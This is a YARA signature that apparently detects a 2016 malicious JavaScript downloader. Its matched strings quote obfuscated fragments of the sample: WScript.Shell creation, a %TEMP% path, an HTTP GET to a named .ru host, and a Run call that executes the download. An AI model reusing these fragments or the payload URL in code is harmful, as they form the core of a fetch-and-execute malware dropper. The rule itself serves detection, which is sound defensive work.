rule sig_20160427_3910773790d0613caaa257ddbe709747 {
  meta:
    description = "datamaliciousorder - file 20160427_3910773790d0613caaa257ddbe709747.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9d6f5e6f87ff02d21dc5ef664edbf38f07c62540d4649e4de9732d4ecf8ce476"

  strings:
    $s1  = "function SqacjWucyk() {return YmuyqOnafq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"2sie2QQ" ascii
    $s2  = "function SqacjWucyk() {return YmuyqOnafq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"2sie2QQ" ascii
    $s3  = "function OtqheVxyfp(TcwylOsuvo, LrehfEpbzl){PyqgbNxtkf = PyqgbNxtkf * 1; return TcwylOsuvo - LrehfEpbzl;};" fullword ascii
    $s4  = "var YmuyqOnafq = function MpvmqSlhdo() {return IgidxLcwcl[IcqbfOocsn](\"WScript\"+\".Shell\");}(), LnxeiDfxuk = 11;" fullword ascii
    $s5  = "LlyixWrmuz[ZemmaFaguv](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var IgidxLcwcl = this[\"WScript\"];" fullword ascii
    $s7  = "if (LlyixWrmuz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function AhizyScchd(){return NahanDbimu + \"\";};" fullword ascii
    $s9  = "function HmgzxIdsjq() {return ((GfauvKmpsv == true) && (GfauvKmpsv == RgtrpAwgse)) ? 1 : PyqgbNxtkf;};" fullword ascii
    $s10 = "var VsdtcZoydp = false;" fullword ascii
    $s11 = "function HvmdrKhacj(UxycmByfty) {var EbqjqXnuef = (1, 2, 3, 4, 5, UxycmByfty); return EbqjqXnuef;};" fullword ascii
    $s12 = "VsdtcZoydp = true;" fullword ascii
    $s13 = "function KjrzeDghlq(){return 23;};" fullword ascii
    $s14 = "var RgtrpAwgse = false;" fullword ascii
    $s15 = "RgtrpAwgse = true; " fullword ascii
    $s16 = "GfauvKmpsv = true; " fullword ascii
    $s17 = "function FzfulNylgj()" fullword ascii
    $s18 = "function ZlbuoTosed(HelxgAnmue){YmuyqOnafq[\"R\"+\"un\"](HelxgAnmue, PyqgbNxtkf, PyqgbNxtkf);};" fullword ascii
    $s19 = "function UrptrRdtqy(){return IcqbfOocsn;};" fullword ascii
    $s20 = "}while (RtnxuLhrhd);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}